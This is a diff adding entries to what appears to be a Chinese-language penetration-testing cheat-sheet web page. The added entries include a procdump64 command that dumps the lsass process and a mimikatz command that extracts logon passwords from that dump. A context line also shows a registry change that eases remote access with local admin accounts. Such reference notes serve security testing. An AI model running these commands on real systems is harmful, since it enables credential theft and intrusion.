@@ -676,6 +676,9 @@
 <td></td>
 </tr>
 </tbody></table>
+<h2 id="Minikaz"><a href="#Minikaz" class="headerlink" title="Minikaz"></a>Minikaz</h2><p>获取123.dmp文件的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe log &quot;sekurlsa::minidump 123.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
+
 <h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><table>
 <thead>
 <tr>
@@ -1070,6 +1073,12 @@
 <td></td>
 </tr>
 </tbody></table>
+<h2 id="procdump64"><a href="#procdump64" class="headerlink" title="procdump64"></a>procdump64</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">下载地址</a></p>
+<p>dump lsass进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="pyinstaller"><a href="#pyinstaller" class="headerlink" title="pyinstaller"></a>pyinstaller</h2><p>python的第三方库</p>
 <table>
 <thead>
@@ -2600,6 +2609,11 @@
 <td>reg add hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1</td>
 <td></td>
 </tr>
+<tr>
+<td>查看RDP开放的端口</td>
+<td><code>reg query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</code></td>
+<td>返回的值为端口号的十六进制</td>
+</tr>
 </tbody></table>
 <h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><table>
 <thead>
@@ -2724,6 +2738,11 @@
 <tr>
 <td>创建文件夹</td>
 <td>mkdir 文件夹</td>
+<td></td>
+</tr>
+<tr>
+<td>后台运行命令</td>
+<td>nohup 命令 &amp;</td>
 <td></td>
 </tr>
 <tr>
